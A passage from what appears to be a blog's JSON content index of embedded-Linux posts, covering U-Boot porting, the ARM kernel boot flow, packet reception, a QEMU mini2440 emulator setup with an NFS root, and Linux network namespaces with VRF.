style=&quot;font-family:幼圆; font-size:12pt&quot;&gt;&lt;span style=&quot;color:red&quot;&gt;**Makefile**&lt;/span&gt; &lt;/span&gt; MAKEALL config.mk rules.mk mkconfig &lt;span style=&quot;font-family:幼圆; font-size:12pt&quot;&gt;控制整个编译过程的主&lt;span style=&quot;color:red&quot;&gt;Makefile&lt;/span&gt;文件和规则文件&lt;/span&gt; &lt;span style=&quot;font-family:幼圆&quot;&gt;&lt;span style=&quot;font-size:10pt&quot;&gt;CHANGELOG&lt;/span&gt;&lt;span style=&quot;font-size:12pt&quot;&gt; &lt;/span&gt;&lt;/span&gt; CHANGELOG-before-U-Boot-1.1.5 COPYING CREDITS MAINTAINERS README &lt;span style=&quot;font-family:幼圆; font-size:12pt&quot;&gt;一些介绍性的文档、版权说明&lt;/span&gt; &lt;span style=&quot;color:black; font-family:幼圆; font-size:10pt; background-color:white&quot;&gt;标为&lt;span style=&quot;color:red&quot;&gt;红色&lt;span style=&quot;color:black&quot;&gt;的是移植时比较重要的文件或文件夹。 # U-boot代码的大致执行流程（以S3C24x0为例） 从链接脚本文件u-boot.lds中可以找到代码的起始： OUTPUT_FORMAT(“elf32-littlearm”, “elf32-littlearm”, “elf32-littlearm”) &lt;/span&gt;&lt;/span&gt; OUTPUT_ARCH(arm) ENTRY(_start) SECTIONS { . = 0x00000000; . = ALIGN(4); .text : { cpu/arm920t/start.o (.text) *(.text) } …… &lt;span style=&quot;font-family:幼圆; font-size:12pt&quot;&gt;从中知道程序的入口点是_start，定位于cpu/arm920t /start.S（即u-boot启动的第一阶段）。 # U-boot版本相关 1、版本号变化： 2008年8月及以前 按版本号命名：u-boot-1.3.4.tar.bz2(2008年8月更新) 2008年8月以后均按日期命名。 目前最新版本：u-boot-2011.06.tar.bz2（2011年6月更新） 2、目录结构变化： u-boot目录结构主要经历过2次变化，u-boot版本第一次从u-boot-1.3.2开始发生变化，主要增加了api的内容；变化最大的是第二次，从2010.6版本开始。 u-boot-2010.03及以前版本 ├──api 存放uboot提供的接口函数 ├──board 根据不同开发板定制的代码，代码也不少 ├──common 通用的代码，涵盖各个方面，已命令行处理为主 ├──cpu 与体系结构相关的代码，uboot的重头戏 ├──disk 磁盘分区相关代码 ├──doc 文档，一堆README开头的文件 ├──drivers 驱动，很丰富，每种类型的设备驱动占用一个子目录 ├──examples 示例程序 ├──fs 文件系统，支持嵌入式开发板常见的文件系统 ├──include 头文件，已通用的头文件为主 ├──lib_【arch】 与体系结构相关的通用库文件 ├──nand_spl NAND存储器相关代码 ├──net 网络相关代码，小型的协议栈 ├──onenand_ipl ├──post 加电自检程序 └──tools 辅助程序，用于编译和检查uboot目标文件 从u-boot-2010.06版本开始把体系结构相关的内容合并，原先的cpu与lib_arch内容全部纳入arch中，并且其中增加inlcude文件夹；分离出通用库文件lib。 u-boot-2010.06及以后版本 ├──api 存放uboot提供的接口函数 ├──arch 与体系结构相关的代码，uboot的重头戏 ├──board 根据不同开发板定制的代码，代码也不少 ├──common 通用的代码，涵盖各个方面，已命令行处理为主 ├──disk 磁盘分区相关代码 ├──doc 文档，一堆README开头的文件 ├──drivers 驱动，很丰富，每种类型的设备驱动占用一个子目录 ├──examples 示例程序 ├──fs 文件系统，支持嵌入式开发板常见的文件系统 ├──include 头文件，已通用的头文件为主 ├──lib 通用库文件 ├──nand_spl NAND存储器相关代码 ├──net 网络相关代码，小型的协议栈 ├──onenand_ipl ├──post 加电自检程序 └──tools 辅助程序，用于编译和检查uboot目标文件 3、移植工作涉及的目录情况 从uboot代码根目录，可以看出其已经非常庞大，功能也很丰富。 移植工作最主要的是看对应的处理器和开发板代码，2010.06版本以后处理器相关的代码集中在arch、board目录。(以前版本主要在cpu和board目录) 先看一下arch目录： arch ├──arm ├──avr32 ├──blackfin ├──i386 ├──m68k ├──microblaze ├──mips ├──nios2 ├──powerpc ├──sh └──sparc arch目录内容比以前的版本干净，每个子目录代表一个处理器类型，子目录名称就是处理器的类型名称。 我们移植的是mips的处理器，所以参考一下arch/mips目录： arch/mips ├──cpu ├──include └──lib arch/mips目录下有三个目录，其他的处理器目录下也是这个结构： cpu子目录对应一种处理器的不同产品型号或者系列; include子目录是处理器用到的头文件； lib目录对应用到处理器公用的代码； 下面看看cpu下的内容，arch/mips/cpu目录下的内容： arch/mips/cpu ├──asc_serial.c ├──asc_serial.h ├──au1x00_eth.c ├──au1x00_serial.c ├──au1x00_usb_ohci.c ├──au1x00_usb_ohci.h ├──cache.S ├──config.mk ├──cpu.c ├──incaip_clock.c ├──incaip_wdt.S ├──interrupts.c ├──Makefile └──start.S 整个uboot代码入口点 目前最新版本(2011.6版本开始)中cpu目录中建立mips32目录，把incaip和au1x00也分类放在不同的目录中。 u-boot.lds是ld程序也就是连接器的脚本文件，这个文件描述了如何连接目标文件，ld程序会根据这个文件的指示按照需求把不同的目标文件连接在一起生成供烧写到开发板的程序。 该文件放在board对应的目录中。 4、移植u-boot的版本选择情况 由于u-boot的各版本没有重大变化，各版本移植起来基本相同，也正因为如此，大多数版本均有人移植过，主要是arm体系结构的。 如cortex A8使用 u-boot-1.3.4；cortex M3 上u-boot-1.1.6、u-boot-1.2.0等均有人移植过。 考虑到我们目前的编译器较新，编译旧版本u-boot时会出现错误，警告也很多；新版本的u-boot目录结构也较清晰，因此选用较新版本的u-boot。 最新版本（2011.06）Makefile中没有mips的部分，不知道为什么。（2011.03版本中同样也是） u-boot-2010.12的Makefile没有问题，编译incaip通过，没有任何警告和错误，因此最终选择u-boot-2010.12作为我们的移植版本。","categories":[{"name":"arm","slug":"arm","permalink":"http://demonelf.github.io/categories/arm/"},{"name":"EMBEDDED","slug":"arm/EMBEDDED","permalink":"http://demonelf.github.io/categories/arm/EMBEDDED/"}],"tags":[]},{"title":"linux接收数据包的处理流程","slug":"EMBEDDED/linux接收数据包的处理流程","date":"2016-10-13T02:06:37.000Z","updated":"2017-07-10T08:52:59.428Z","comments":true,"path":"EMBEDDED/linux接收数据包的处理流程.html","link":"","permalink":"http://demonelf.github.io/EMBEDDED/linux接收数据包的处理流程.html","excerpt":"1. 硬件收到数据，驱动取出数据，通过netif_rx把数据放到queue->input_pkt_queue中， 并产生NET_RX_SOFTIRQ软中断。 2. 在启动内核时，通过open_softirq(NET_RX_SOFTIRQ, net_r","text":"1. 硬件收到数据，驱动取出数据，通过netif_rx把数据放到queue-&gt;input_pkt_queue中， 并产生NET_RX_SOFTIRQ软中断。 2. 在启动内核时，通过open_softirq(NET_RX_SOFTIRQ, net_rx_action); 注册了软中断回调函数net_rx_action。 3. net_rx_action判断是否queue-&gt;input_pkt_queue是否有数据，如果有再通过process_backlog 调用netif_receive_skb处理。 4. netif_receive_skb通过ptype_base判断数据类型，再调用对应的fun(arp_rcv|ip_rcv) 5. ip_rcv做IP头检查，再调用ip_route_input设置数据包的路由。 调用dst_input 如果是本地包则调用ip_local_deliver 如果是转发包则调用ip_forward 6. 在ip_local_deliver中， 例如，如果是ping包，则调用icmp_rcv把数据放到sk-&amp;gt;sk_receive_queue 7. socket 通过中断到内核的 sys_socketcall-&gt;Sys_read-&gt;Sock_read-&gt;sock_recvmsg-&gt;inet_recvmsg-&gt; udp_recvmsg-&gt;skb_recv_datagram从sk-&gt;sk_receive_queue把数据取出来。 再来个图让你更清晰：收包示例 这里值得总结一下。 当IP报文从软中断上来的时候， 则必须从ptype_base[]数组中找到对应函数，目前内核中与IP有关的只有3个， 一个是ip_packet_type，另一个是arp_packet_type，最后是rarp_packet_type。 如果是ip报文，当执行到ip_local_deliver_finish时， 则应该从inet_protos[]数组中找到对应函数，里面包含ICMP、UDP、TCP等上层协议的处理函数。 这2个数组极易造成混淆，因为都有一个回调函数。在经历这么多函数的研究，读者可能都有点晕了。 一个比较好的记忆方法是：对于前一个，其回调函数是func，处理packet，后一个回调函数是handler，处理协议。 以上为收包流程，收包的时候，利用中断直接定位到s3c_dm9000_recv 但大家还需思考下发包的时候是如果定位到s3c_dm9000_send函数的呢？","categories":[{"name":"arm","slug":"arm","permalink":"http://demonelf.github.io/categories/arm/"},{"name":"EMBEDDED","slug":"arm/EMBEDDED","permalink":"http://demonelf.github.io/categories/arm/EMBEDDED/"}],"tags":[]},{"title":"Find which package contains a file","slug":"EMBEDDED/find-which-package-contains-a-file","date":"2016-09-28T08:16:00.000Z","updated":"2017-07-10T08:48:58.497Z","comments":true,"path":"EMBEDDED/find-which-package-contains-a-file.html","link":"","permalink":"http://demonelf.github.io/EMBEDDED/find-which-package-contains-a-file.html","excerpt":"dpkg –search /usr/bin/amidi # debian/ubuntu, local search apt-file update;apt-file search amidi # debian/ubuntu, remote seach.","text":"dpkg –search /usr/bin/amidi # debian/ubuntu, local search apt-file update;apt-file search amidi # debian/ubuntu, remote seach. You need install apt-file at first. equery b -e amidi # gentoo, remote/local search. You need install gentoolkits at first pacman -Qo admidi # archlinux, local search pkgfile amidi # archlinux, You need install pkgfile","categories":[{"name":"arm","slug":"arm","permalink":"http://demonelf.github.io/categories/arm/"},{"name":"EMBEDDED","slug":"arm/EMBEDDED","permalink":"http://demonelf.github.io/categories/arm/EMBEDDED/"}],"tags":[]},{"title":"arm环境u-boot功能和linux启动过程","slug":"EMBEDDED/arm环境u-boot功能和linux启动过程","date":"2016-09-19T07:58:02.000Z","updated":"2017-07-28T02:41:34.563Z","comments":true,"path":"EMBEDDED/arm环境u-boot功能和linux启动过程.html","link":"","permalink":"http://demonelf.github.io/EMBEDDED/arm环境u-boot功能和linux启动过程.html","excerpt":"1. # U-BOOT概况总结 1. 启动代码为start.S 2. 由于u-boot为裸板上第一个程序，所以要初始化各个外设，由于u-boot已经初始化了，包括：中断禁用、分配动态内存、初始化BBS区域、初始化页目录、打开","text":"# U-BOOT概况总结 启动代码为start.S 由于u-boot为裸板上第一个程序，所以要初始化各个外设，由于u-boot已经初始化了，包括：中断禁用、分配动态内存、初始化BBS区域、初始化页目录、打开缓存等任务。所以linux内核不需要全部再次初始化，所以可以理解bootloader和kernel其实是两兄弟。 U-boot引导内核第一步要做的的是把内核下到ram中，然后跳到内核的start函数。例:12345678910111213/*start code on reset*/ Reset: bl set_cpu_mode /*设置特权模式*/ bl turn_off_watchdog /*关闭看门狗*/ bl mask_irqs /*关闭中断*/ bl set_clock /*设置时钟*/ bl disable_id_caches /*关闭caches*/ bl init_memory /*初始化sram*/ bl init_stack /*初始化栈*/ bl clean_bss /*初始化bss*/ bl nand_init /*初始化nand*/ bl copy_to_ram /*复制自身到ram*/ ldr pc, =arm_main /*执行main函数*/ 四、bootloader必须提供5种功能：RAM初始化、串行端口初始化、查找机器类别、构建tagged list内核、将控制移交到内核镜像。 # linux内核初始化流程 u-boot跳到linux内核的arch/arm/boot/compressed/head.S中start后 内核大致可以理解为三部曲： 第一步 解压内核并跳到start_kernel()。 1.arch/arm/boot/compressed/head.S(start) 准备解压内核 2.arch/arm/boot/compressed/head.S 通过decompress_kernel 解压zImage 通过call_kernel调用已解压后内核vmlinux 3.arch/arm/kernel/head.S 通过ENTRY(stext)-&gt; 处理器信息搜寻——__look_processor_type 搜寻我的机型——__lookup_machine_type 通过__mmap_switched调用start_kernel 第二步 跳到真正第一个内核代码init/main.c(start_kernel())。注:在linux 0.11中为init/main.c main()。 其中明星函数（排名不分先后）： 1.初始化console(此处为平台相关需要hack的地方&lt;1&gt;) start_kernel-&gt;console_init-&gt;serial_pxa_console_init 2.处理与架构相关的一系列事物 start_kernel-&gt;setup-arch() 3.初始化驱动平台platform start_kernel→kernel_init()→do_basic_setup()→driver_init()→platform_bus_init()→bus_register(&amp;platform_bus_type) 4.初始化soc(initcall参考 下面的init.h) start_kernel-&gt;kernel_init-&gt;依次调用do_basic_setup()-&gt;do_initcalls()-&gt;do_one_initcall() 第三步 就为愉快的init的代码了也就是第一个进程，在linux 0.11中集成在内核中。在之后版本由用户态提供。 当然我已经升级为systemd啦，哈哈。 1. linux初始化代码框架 哪部分是只和CPU相关的部分， 哪部分是SOC平台相关的部分， 也再次标明LINUX下大致逻辑。 第一部分代码arch/arm/boot/简介：也就是自我解压部分，可以理解为和cpu相关但和SOC无关。移植：移植时选择对应的cpu。功能：arch/arm/boot/compressed/head.S自我解压前准备、解压缩。跳到start_kernel。 第二部分代码init/main.c简介：也就是start_kernel（）或0.11中的main（） 可以理解内核真正的第一代码。为平台无关代码。 移植：移植时不用管。 功能：此代码虽说简单的大几十行，但功能太多，我还是给个linux 0.11中main()的靓照吧~_~！ 第三部分代码 arch/arm/PLAT- arch/arm/MACH- 简介：为了完成start_kernel()中初始化的SOC相关部分。 移植：移植时需要考虑对应的SOC。没有对应soc支持时，才是各路玩家大显身手的时候。 功能：看下面的介绍吧。1. Mini2440的plat和machplat-s3c24xxmach-s3c2440mach-s3c2410 ====================== 三星这样分层的理由是s3c系列的soc具有一定的共通性, plat-实现了一些较通用的封装, 这些封装的具体参数一般是宏, 这些宏如寄存器地址可能是在mach-里面被定义; linux/arch/arm/plat-s3c24xx/common-smdk.c static struct s3c24xx_led_platdata smdk_pdata_led5 = { .gpio = S3C2410_GPF5, .flags = S3C24XX_LEDF_ACTLOW | S3C24XX_LEDF_TRISTATE, .name = &quot;led5&quot;, .def_trigger = &quot;nand-disk&quot;, }; linux/include/asm-arm/arch-s3c2410/regs-gpio.h #define S3C2410_GPF5 S3C2410_GPIONO(S3C2410_GPIO_BANKF, 5) 原则上是把所有s3c系列共同的东西放在 plat-里面去, 具体的io或者比较有mach-特色的部分放到mach-里面; 改板时, 实际上大多是直接在mach-里面增删自己的功能. (不按三星预设方案的改动除外) plat里面需要动的相对更少, 不过在linux/arch/arm/plat-s3c24xx/common-smdk.c里面, 我们可以根据实际情形来分配nand的分区(修改static struct mtd_partition smdk_default_nand_part[] ); 3. 编译时,一般只会选中一个特定的mach-, mach-会调用plat-的功能具体实现平台的资源和设备初始化. MACHINE_START 以mach-s3c2440/mach-smdk2440.c 为例： MACHINE_START(S3C2440, “SMDK2440”) / Maintainer: Ben Dooks &lt;ben@fluff.org&gt; / .phys_io = S3C2410_PA_UART, .io_pg_offst = (((u32)S3C24XX_VA_UART) &gt;&gt; 18) &amp; 0xfffc, .boot_params = S3C2410_SDRAM_PA + 0x100, .init_irq = s3c24xx_init_irq, .map_io = smdk2440_map_io, .init_machine = smdk2440_machine_init, .timer = &amp;s3c24xx_timer, MACHINE_END start_kernel里setup_arch： mdesc = setup_machine(machine_arch_type); init_arch_irq = mdesc-&gt;init_irq; system_timer = mdesc-&gt;timer; init_machine = mdesc-&gt;init_machine; mdesc 即是我们定义的machine type，这个结构体里我们定义的借口调用顺序如下： mdesc-&gt;fixup()； //setup_arch调用 mdesc-&gt;map_io()； //setup_arch-》paging_init-》devicemaps_init init_arch_irq； //start_kernel-》init_IRQ system_timer-&gt;init(); //start_kernel-》time_init init_machine; //arch_initcall 通过本文可以体会到，对于内核，移植它改造它有难度呀。 会裸板驱动、会写bootloader只是基础。 还要熟悉内核代码，真是上知系统、应用，下知硬件、驱动。 参考资料： [console] early printk实现流程 http://blog.csdn.net/ooonebook/article/details/52654120 linux2.6中的console_init初始化的研究 http://blog.csdn.net/breeze_vickie/article/details/5563375 linux下tty，控制台，虚拟终端，串口，console（控制台终端）详解 http://blog.csdn.net/liaoxinmeng/article/details/5004743 【原创】s3c2440内核启动时如何注册串口为终端设备 http://blog.sina.com.cn/s/blog_70ef2ee90100zc4z.html","categories":[{"name":"arm","slug":"arm","permalink":"http://demonelf.github.io/categories/arm/"},{"name":"EMBEDDED","slug":"arm/EMBEDDED","permalink":"http://demonelf.github.io/categories/arm/EMBEDDED/"}],"tags":[]},{"title":"CAN与以太网区别","slug":"EMBEDDED/CAN与以太网区别","date":"2016-09-06T01:24:19.000Z","updated":"2017-07-10T08:45:29.023Z","comments":true,"path":"EMBEDDED/CAN与以太网区别.html","link":"","permalink":"http://demonelf.github.io/EMBEDDED/CAN与以太网区别.html","excerpt":"工业以太网与CAN总线的比较(2008-07-19 20:49:20) 2008-07-23 10:45 1. 工业以太网的优势及存在问题 (1)优势 基于TCP / IP的以太网是一种标准开放式的网络,由其组成的系统兼容性和互操作性好","text":"工业以太网与CAN总线的比较(2008-07-19 20:49:20) 2008-07-23 10:45 1. 工业以太网的优势及存在问题(1)优势基于TCP / IP的以太网是一种标准开放式的网络,由其组成的系统兼容性和互操作性好,资源共享能力强,可以很容易的实现将控制现场的数据与信息系统上的资源共享;数据的传输距离长、传输速率高;易与Internet连接,低成本、易组网,与计算机、服务器的接口十分方便,受到了广泛的技术支持。(2)存在问题以太网采用的是带有冲突检测的载波侦听多路访问协议(CSMA /CD) ,无法保证数据传输的实时性要求,是一种非确定性的网络系统; 安全可靠性问题,以太网采用超时重发机制,单点的故障容易扩散,造成整个网络系统的瘫痪;对工业环境的适应能力问题,目前工业以太网的鲁棒性和抗干扰能力等都是值得关注的问题,很难适应环境恶劣的工业现场;本质安全问题,在存在易燃、易爆、有毒等环境的工业现场必须要采用安全防爆技术;总线供电问题。在环境恶劣危险场合,总线供电具有十分重要的意义。2. CAN现场总线的特点及局限性(1)特点CAN现场总线的数据通信具有突出的可靠性、实时性和灵活性。主要表现在CAN为多主方式工作; CAN总线的节点分成不同的优先级;采用非破坏仲裁技术;报文采用短帧结构,数据出错率极低;节点在错误严重的情况下可自动关闭输出。(2)局限性CAN现场总线作为一种面向工业底层控制的通信网络,其局限性也是显而易见的。首先,它不能与Internet互连,不能实现远程信息共享。其次,它不易与上位控制机直接接口,现有的CAN接口卡与以太网网卡相比大都价格昂贵。还有, CAN现场总线无论是其通信距离还是通信速率都无法和以太网相比。3. 工业以太网和CAN现场总线的网络协议规范比较工业以太网和CAN现场总线的网络协议规范都遵循ISO /OSI参考模型的基本层次结构。工业以太网采用IEEE802参考模型,相当于OSI模型的最低两层,即物理层和数据链路层,其中数据链路层包含介质访问控制子层(MAC)和逻辑链路控制子层(LLC) 。CAN现场总线的ISO /OSI参考模型也是分为两层,并与工业以太网的分层结构完全相同,但是二者在各层的物理实现及通信机理上却有很大的差别。工业以太网和CAN现场总线的各层在具体网络协议实现上的分析比较如下表所示。 工业以太网CAN现场总线 物理层传输介质TP5类线、屏蔽双绞线、同轴电缆、光纤、无线传输等屏蔽双绞线、同轴电缆、光纤、无线传输等编码同步 NRZ、曼彻斯特编码异步 NRZ 插件RJ45、AUI、BNC各种防护等级的工业级插件 总线供电和本质安全无有 传输速率10M、100M等5 kbps～1Mbps 数据链路层介质访问控制子层介质访问方式采用 CSMA/CD （载波监听多路访问/冲突检测），工业以太网很难满足工业网络通信的实时性和确定性的要求,在网络负载很重的情况下可能出现网络瘫痪的情况。负责报文分帧、仲裁、应答、错误检测和标定。采用非破坏总线仲裁技术及短帧传送数据,能够满足工业控制的实时性和确定性的要求,而且在网络负载很重的情况下也不会出现网络瘫痪的情况。逻辑链路控制子层组帧、处理传输差错、调整帧流速。报文滤波、过载通知及恢复管理。","categories":[{"name":"arm","slug":"arm","permalink":"http://demonelf.github.io/categories/arm/"},{"name":"EMBEDDED","slug":"arm/EMBEDDED","permalink":"http://demonelf.github.io/categories/arm/EMBEDDED/"}],"tags":[]},{"title":"gns3_C3640模拟三层交换机","slug":"EMBEDDED/gns3_C3640模拟三层交换机","date":"2016-08-23T05:34:08.000Z","updated":"2017-07-12T05:14:57.416Z","comments":true,"path":"EMBEDDED/gns3_C3640模拟三层交换机.html","link":"","permalink":"http://demonelf.github.io/EMBEDDED/gns3_C3640模拟三层交换机.html","excerpt":"gns3对支持三层交换机并不完善。但也可以模拟。 以C3640为例，需要添加NM-16ESW交换模块端口。 添加vlan需在vlan database模式下。 查看为show vlan-switch 如果交换端口直接连接的为PC， 则需要在端口模","text":"gns3对支持三层交换机并不完善。但也可以模拟。 以C3640为例，需要添加NM-16ESW交换模块端口。 添加vlan需在vlan database模式下。 查看为show vlan-switch 如果交换端口直接连接的为PC， 则需要在端口模式下配置 speed 100 duplex full 不然端口是不能全up的。 这个问题还真是让我愁了一上午，额。 命令如下: 123456789enablevlan databasevlan 2exitconfigure terminalinterface range fastethernet0/2 -17switchport mode accessswitchport access vlan 1exit","categories":[{"name":"arm","slug":"arm","permalink":"http://demonelf.github.io/categories/arm/"},{"name":"EMBEDDED","slug":"arm/EMBEDDED","permalink":"http://demonelf.github.io/categories/arm/EMBEDDED/"}],"tags":[]},{"title":"使用qemu 建立mini2440的模拟仿真环境","slug":"EMBEDDED/使用qemu 建立mini2440的模拟仿真环境","date":"2016-08-14T01:42:16.000Z","updated":"2017-07-28T06:24:02.045Z","comments":true,"path":"EMBEDDED/使用qemu 建立mini2440的模拟仿真环境.html","link":"","permalink":"http://demonelf.github.io/EMBEDDED/使用qemu 建立mini2440的模拟仿真环境.html","excerpt":"http://www.cnblogs.com/jinmu190/archive/2011/03/21/1990698.html 1. 首先下载qemu for mini2440 git clone git://repo.or.cz/qemu/mini2","text":"http://www.cnblogs.com/jinmu190/archive/2011/03/21/1990698.html1. 首先下载qemu for mini2440 git clone git://repo.or.cz/qemu/mini2440.git qemu 如果感觉速度慢，直接打包下载 http://repo.or.cz/w/qemu/mini2440.git/snapshot/HEAD.tar.gz 解压后，今日源代码的主目录中，12# ./configure --target-list=arm-softmmu# make -j4 2. 下载u-boot for mini2440 git clone git://repo.or.cz/w/u-boot-openmoko/mini2440.git uboot 或者打包下载 http://repo.or.cz/w/u-boot-openmoko/mini2440.git/snapshot/HEAD.tar.gz （注意 采用打包下载的时候这几个包的文件名可能相同，注意区分）解压后，配置Makefile文件，打开Makefile文件，CROSS_COMPILE变量赋值，即自己所使用的交叉编译工具链，比如我的是arm-none-linux-gnueabi-，保存退出，输入 123#make distclean #make mini2440_config #make -j4 稍等两分钟，即在当前目录下生成名为 u-boot.bin 的文件，注意如果想在之后使用u-boot 的nfs下载文件功能，需要修改代码中的一部分，将net/nfs.c文件中的 NFS_TIMEOUT = 2UL 修改为 NFS_TIMEOUT = 20000UL 否则会造成nfs文件下载失败，如果不使用nfs下载功能，不改也可。 3. 下载 linux kernel for mini2440 （下载步骤略去） 进入源码目录 make mini2440_defconfig ARCH=armmake -j4 ARCH=arm CROSS_COMPILE=arm-none-linux-gnueabi- uImage 之后会在arch/arm/boot/目录下生成uImage 文件，将此文件复制到qemu目录下的mini2440文件夹下，并将mini2440文件夹中的mini2440_start.sh作如下修改 将 kernel 一行改为-kernel “$base/uImage” \\,回到上层目录后运行 sh mini2440/mini2440_start.sh 这时应该看到qemu启动后进入了u-boot界面下，输入命令 bootm 就会看到linux内核启动的画面，但此时还没有根文件系统，我们稍候介绍采用nfs挂在根文件系统 4. 假设你用的操作系统为ubuntu，首先安装 nfs服务器 sudo apt-get install nfs-kernel-server 之后修改/etc/exports文件，添加如下一行 /home/username/nfs *(rw,sync,no_root_squash) ………………..注意 /home/username/nfs 为你所要共享的目录 输入命令 sudo /etc/init.d/nfs-kernel-server restart 启动 nfs服务 测试 nfs服务是否成功启动 sudo mkdir /mnt/nfs sudo mount -t nfs localhost:/home/username/nfs /mnt/nfs 查看/mnt/nfs文件是否于/home/username/nfs 中相同，若一样 ，OK 5. 将mini2440目录下的mini2440_start.sh修改为12345678#!/bin/shsudo ../arm-softmmu/qemu-system-arm \\ -M mini2440 -kernel mini2440/uImage -serial stdio \\ -net nic,vlan=0 -net tap,vlan=0,ifname=tap0,script=./qemu- ifup,downscript=./qemu-ifdown \\ -show-cursor \\ -usb -usbdevice keyboard -usbdevice mouse 在建立两个脚本,分别为qemu-ifup, qemu-ifdown qemu-ifup 脚本 123#!/bin/shecho &quot;Excuting qemu-ifup&quot;ifconfig $1 10.0.0.1 qemu-ifdown脚本123#!/bin/shecho &quot;Close tap!&quot;sudo ifconfig $1 10.0.0.1 down 6. 当这些都配置好后，我们即可使用nfs根文件系统了 这里我们的根文件系统为 /home/username/nfs 在qemu的目录中输入 ./mini2440/mini2440_start.sh u-boot启动成功后输入设置linux kernel的引导参数1set bootargs noinitrd root=/dev/nfs rw nfsroot=10.0.0.1:/home/lizhao/ARM-pro/nfs/rootfs ip=10.0.0.10:10.0.0.1::255.255.255.0 console=ttySAC0,115200 再输入命令 bootm OK ！ kernel就开始加载了，文件系统挂在成功后，就可以进行各种仿真工作了，下面是我挂载的由友善之臂提供的mini2440的qtopia文件系统的截图： 友善之臂提供的qtopia文件系统在挂载时会初始化网卡，但我们是由nfs挂载的文件系统，这会导致nfs连接中断，挂载失败，所以用nfs挂载之前需要把网卡的初始化过程取消，对应的文件是/etc/init.d/if-config，只需把该文件内容清空即可。Enjoy yourself! 目前，我打算让GPE环境在这仿真环境中跑起来，目前还没有成功，正在尝试中。","categories":[{"name":"arm","slug":"arm","permalink":"http://demonelf.github.io/categories/arm/"},{"name":"EMBEDDED","slug":"arm/EMBEDDED","permalink":"http://demonelf.github.io/categories/arm/EMBEDDED/"}],"tags":[]},{"title":"VRF & Linux Network Name Space","slug":"EMBEDDED/vrf-linux-network-name-space","date":"2016-08-10T08:24:15.000Z","updated":"2017-07-10T08:51:48.377Z","comments":true,"path":"EMBEDDED/vrf-linux-network-name-space.html","link":"","permalink":"http://demonelf.github.io/EMBEDDED/vrf-linux-network-name-space.html","excerpt":"Introduction As we know, VRF (Virtual Routing and Forwarding on Switch) and Linux Network Name Space (on Linux hosts) can be u","text":"Introduction As we know, VRF (Virtual Routing and Forwarding on Switch) and Linux Network Name Space (on Linux hosts) can be used to achieve Network Isolation. Lets see how we can use them together. Setup Host there are two namespaces, namely red and blue.Each of the namespace is connected to its own Linux Bridge (i.e Red Namespace is connected to Bridge_red and Blue Namespace is connected to Bridge_Blue ). Virtual Interface (veth0) connected to each bridge is assigned the same ip address (10.70.70.12/24). This L3 Network isolation achieved on the same host by using Network Namespaces. Bridge_red is connected to external interface eth5 via eth5.80(eth5.80 sends tagged packet with vlan value as 80).Bridge_blue is connected to external interface eth5 via eth5.90(eth5.80 sends tagged packet with vlan value as 90). Linux host is connected to external device (that has VRF capability). 10.70.70.14/24 is the ip address configured on both the blue and red vrf’s. Commands to Create Red Name Space //Create a red namespace ip netns add red //Create eth5.80 (80 vlan tagged interface on eth5) ip link add link eth5 eth5.80 type vlan id 80 //Create a veth pair ip link add veth0 type veth peer name veth_red //Set on end of the veth pair to red namespace ip link set veth0 netns red //Bring up the veth pairs ip netns exec red ip link set dev veth0 up ip link set dev veth_red up //create a red bridge and add interfaces brctl addbr bridge_red brctl addif bridge_red eth5.80 brctl addif bridge_red veth_red //bring up bridge interfaces ip link set dev bridge_red up ip link set dev eth5.80 up //Configuer ip address within the namespace ip netns exec red ifconfig veth0 10.70.70.12 netmask 255.255.255.0 up ip netns exec red ip route add default via 10.70.70.12 Commands to Create Blue Name Space ip link add link eth5 eth5.90 type vlan id 90 //Create a blue Namespace. ip netns add blue //Create veth pair ip link add veth0 type veth peer name veth_blue //assign one end of the veth pair to blue namespace ip link set veth0 netns blue //Bring veth pairs ip netns exec blue ip link set dev veth0 up ip link set dev veth_blue up //Create Linux bridge and add interfaces to it. brctl addbr bridge_blue brctl addif bridge_blue eth5.90 brctl addif bridge_blue veth_blue //Bring up the bridge interfaces ip link set dev bridge_blue up ip link set dev eth5.90 up //Assign ip address to veth pair in the blue Namespace ip netns exec blue ifconfig veth0 10.70.70.12 netmask 255.255.255.0 up ip netns exec blue ip route add default via 10.70.70.12 Commands to Create VRF on external device. //interface connected to eth5 interface GigabitEthernet 3/0/41 switchport switchport mode trunk switchport trunk allowed vlan add 80,90 switchport trunk tag native-vlan spanning-tree shutdown no shutdown ! //Configuration for VRF red rbridge-id 153 vrf red rd 1:1 address-family ipv4 max-route 3600 ! ! interface Ve 80 vrf forwarding red ip proxy-arp ip address 10.70.70.14/24 no shutdown ! ! rbridge-id 153 vrf blue rd 1:2 address-family ipv4 max-route 3600 ! ! ! interface Ve 90 vrf forwarding blue ip proxy-arp ip address 10.70.70.14/24 no shutdown ! Communication from Linux host to external device (ie Network Namespace to VRF) Here ping is initiated from the veth0(10.70.70.12) in the blue namespace to 10.70.70.14 (in the blue VRF) ping is initiated from the veth0(10.70.70.12) in the red namespace to 10.70.70.14 (in the redVRF) an be used on LinuxBridge interfaces to verify that traffic is indeed flowing to the correct VRF on the external device. Network Isolation (L3,ip address isolation) can be achieved by using Linux Network Namespaces and VRFs.Also, we have seen here how they can be interconnected. Network Isolation is an important concept in multi-tenant cloud environment.","categories":[{"name":"arm","slug":"arm","permalink":"http://demonelf.github.io/categories/arm/"},{"name":"EMBEDDED","slug":"arm/EMBEDDED","permalink":"http://demonelf.github.io/categories/arm/EMBEDDED/"}],"tags":[]},{"title":"linux上通过netns创建vrf模拟MCE设备","slug":"EMBEDDED/linux上通过netns创建vrf模拟MCE设备","date":"2016-08-10T07:38:00.000Z","updated":"2017-07-10T08:44:09.753Z","comments":true,"path":"EMBEDDED/linux上通过netns创建vrf模拟MCE设备.html","link":"","permalink":"http://demonelf.github.io/EMBEDDED/linux上通过netns创建vrf模拟MCE设备.html","excerpt":"转：http://blog.csdn.net/dog250/article/details/26147357 上周有厂商到公司测试，拿了一块据说很猛的网络处理加速PCIe板卡，拎在手里沉甸甸的很有分量，最让人意淫的是那4个万兆光口，于是我迫不及待的想要","text":"转：http://blog.csdn.net/dog250/article/details/26147357 上周有厂商到公司测试，拿了一块据说很猛的网络处理加速PCIe板卡，拎在手里沉甸甸的很有分量，最让人意淫的是那4个万兆光口，于是我迫不及待的想要一览光口转发时那种看不见的震撼。 